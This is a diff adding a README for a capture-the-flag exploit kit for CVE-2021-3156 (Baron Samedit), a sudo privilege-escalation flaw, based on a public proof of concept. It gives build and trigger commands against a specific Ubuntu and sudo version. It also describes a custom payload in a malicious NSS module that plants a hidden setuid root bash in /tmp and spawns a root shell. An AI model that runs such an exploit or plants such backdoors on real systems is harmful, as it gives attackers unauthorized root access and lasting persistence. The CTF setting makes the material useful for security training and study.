@@ -1,0 +1,24 @@
+# CVE-2021-3156 PoC (Baron Samedit) — KPMG CTF "Vodoo Spirit of Death - 2"
+
+Source: https://github.com/blasty/CVE-2021-3156 (blasty's PoC; MIT).
+
+## Build
+
+```
+make             # builds sudo-hax-me-a-sandwich (static) + libnss_X/P0P_SH3LLZ_ .so.2
+```
+
+* `hax.c` is blasty's PoC, unmodified.
+* `lib.c` is a custom root payload compiled into the malicious NSS module. It drops
+  a setuid root bash at `/tmp/.r00t`, writes an id + flag dump to `/tmp/flag_out`
+  (chmod 666), then execs `/bin/sh -c 'id; cat /tmp/flag_out'`.
+
+## Trigger on target
+
+```
+# target index by sudo version:
+#   1 = Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+./sudo-hax-me-a-sandwich 1
+```
+
+Run it with a TTY/PTY (the box's sudo policy demands a terminal).
